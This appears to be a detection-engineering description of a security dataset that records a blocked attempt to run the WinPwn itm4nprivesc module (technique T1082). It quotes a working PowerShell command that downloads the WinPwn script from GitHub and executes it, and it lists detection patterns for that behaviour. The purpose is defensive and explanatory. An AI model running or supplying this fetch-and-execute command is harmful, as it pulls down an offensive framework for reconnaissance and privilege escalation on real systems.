# T1082-15: System Information Discovery — WinPwn - itm4nprivesc

## Technique Context

T1082 System Information Discovery is a fundamental Discovery technique where adversaries gather information about the operating system and hardware to understand their target environment. This intelligence helps determine appropriate follow-on actions, such as privilege escalation vectors, persistence mechanisms, or lateral movement opportunities. The technique is ubiquitous across threat actors and red team operations because system information provides critical context for subsequent attack phases.

Detection engineers focus on distinguishing legitimate administrative activity from malicious reconnaissance. Common indicators include unusual process execution patterns (multiple system information commands in sequence), execution from non-standard locations, or information gathering tools being downloaded and executed. The WinPwn framework's `itm4nprivesc` module represents a comprehensive system enumeration capability that automates many information gathering techniques.

## What This Dataset Contains

This dataset captures a failed attempt to execute the WinPwn framework's `itm4nprivesc` module, which was blocked by Windows Defender's real-time protection. The primary evidence includes:

**PowerShell Script Block Logging (EID 4104)** shows the malicious command attempting to download and execute WinPwn:
- Variable assignment: `$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'`
- Download attempt: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
- Module invocation: `itm4nprivesc -noninteractive -consoleoutput`

**PowerShell Error Logging (EID 4100)** documents Defender's intervention:
- "This script contains malicious content and has been blocked by your antivirus software"
- Error ID: `ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`

**Process Creation (Security EID 4688, Sysmon EID 1)** shows the process chain:
- Parent PowerShell (PID 39828): Initial test framework
- Child PowerShell (PID 8740): Spawned for malicious payload execution
- Whoami execution (PID 40912): The only system discovery command that successfully executed

**Network Activity (Sysmon EID 3, 22)** captures the blocked download attempt:
- DNS query for `raw.githubusercontent.com` resolving to GitHub's CDN IPs
- TCP connection to 185.199.108.133:443 (GitHub CDN)

## What This Dataset Does Not Contain

The dataset lacks the actual system information discovery commands that `itm4nprivesc` would typically execute because Windows Defender blocked the script download. Missing are:

- System information enumeration commands (`systeminfo`, `wmic`, registry queries)
- Privilege escalation checks (service misconfigurations, unquoted service paths)
- Network configuration discovery (`ipconfig`, `netstat`, `arp`)
- File system enumeration activities
- Process and service discovery commands

The Sysmon ProcessCreate events are limited due to the include-mode filtering that only captures processes matching suspicious patterns. Many legitimate system discovery tools wouldn't trigger Sysmon EID 1 events under this configuration.

## Assessment

This dataset provides excellent visibility into the attempt phase of a WinPwn-based system information discovery attack but limited insight into successful execution patterns. The telemetry effectively demonstrates how modern endpoint protection can interrupt attack frameworks before they execute their payloads, creating a specific detection scenario.

The PowerShell logging is comprehensive, capturing both the malicious script blocks and the antivirus intervention. The network telemetry provides clear indicators of the download attempt. However, for understanding actual system discovery behaviors, analysts would need datasets where the technique executes successfully.

The data quality is high for detecting download-and-execute patterns, PowerShell-based attacks, and AV evasion attempts, making it valuable for building preventive detections rather than post-exploitation hunting rules.

## Detection Opportunities Present in This Data

1. **PowerShell Download-and-Execute Pattern**: Script blocks containing `new-object net.webclient` combined with `downloadstring` and `iex` indicate malicious code download attempts.

2. **WinPwn Framework Indicators**: Detection of `S3cur3Th1sSh1t` repository references, WinPwn.ps1 downloads, or `itm4nprivesc` module invocations.

3. **GitHub Raw Content Downloads**: Network connections to raw.githubusercontent.com from PowerShell processes, especially with subsequent script execution.

4. **Antivirus Script Blocking Events**: PowerShell EID 4100 errors with "ScriptContainedMaliciousContent" indicating blocked malicious scripts.

5. **Suspicious PowerShell Process Chains**: Parent-child PowerShell relationships where the child process has a complex command line with download operations.

6. **Non-Interactive PowerShell Execution**: PowerShell processes with `-noninteractive` and `-consoleoutput` parameters combined with network activity.

7. **Command Line Obfuscation Patterns**: PowerShell command lines containing GitHub URLs with commit hashes, indicating specific malware versions.

8. **Process Access Patterns**: Sysmon EID 10 events showing PowerShell processes accessing newly spawned child processes with full access rights (0x1FFFFF).
